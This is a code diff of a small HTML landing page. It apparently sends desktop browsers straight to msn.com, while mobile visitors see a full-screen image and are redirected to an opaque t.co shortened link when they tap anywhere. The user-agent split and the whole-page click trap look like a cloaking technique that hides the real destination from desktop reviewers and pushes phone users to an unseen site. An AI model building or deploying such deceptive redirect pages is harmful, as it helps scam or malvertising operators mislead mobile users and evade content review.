@@ -10,53 +10,28 @@
       padding: 0;
       height: 100%;
       width: 100%;
-      overflow: hidden; /* desktop overflow hidden */
-      font-family: sans-serif;
-    }
-
-    /* Scrollable container for mobile */
-    .slides-container {
-      height: 100%;
-      width: 100%;
-      overflow-y: scroll;
-      scroll-snap-type: y mandatory;
-      -webkit-overflow-scrolling: touch; /* smooth scroll on iOS */
-    }
-
-    .slide {
-      height: 100vh;
-      width: 100vw;
+      background: url('https://i.imgur.com/KRjnVF4.jpeg') no-repeat center center fixed;
       background-size: cover;
-      background-position: center;
-      scroll-snap-align: start;
+      cursor: pointer;
     }
   </style>
   <script>
-    const desktopURL = "https://www.msn.com/it-it"; // Desktop redirect
-    const mobileURL = "https://t.co/lU6lupZ2Qa";    // Mobile redirect on click
-
+    const desktopURL = "https://www.msn.com/it-it";
     const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i
       .test(navigator.userAgent.toLowerCase());
 
     if (!isMobile) {
-      // Redirect desktop users immediately
+      // Desktop users redirected immediately BEFORE loading the image
       window.location.replace(desktopURL);
     }
   </script>
 </head>
 <body>
 
-<!-- Mobile slides -->
-<div class="slides-container">
-  <div class="slide" style="background-image: url('https://i.ibb.co/j92x7mcw/image1.jpg');"></div>
-  <div class="slide" style="background-image: url('https://i.ibb.co/YBMg0Cqj/image2.jpg');"></div>
-  <div class="slide" style="background-image: url('https://i.ibb.co/4ZLgbCF1/image3.jpg');"></div>
-  <div class="slide" style="background-image: url('https://i.ibb.co/21Wb9Ntk/image4.jpg');"></div>
-  <div class="slide" style="background-image: url('https://i.ibb.co/9mRpkhCs/image5.jpg');"></div>
-</div>
-
 <script>
-  // Mobile click redirect
+  const mobileURL = "https://t.co/lU6lupZ2Qa";
+  
+  // Mobile users: redirect when clicking anywhere
   document.body.addEventListener("click", () => {
     window.location.href = mobileURL;
   });
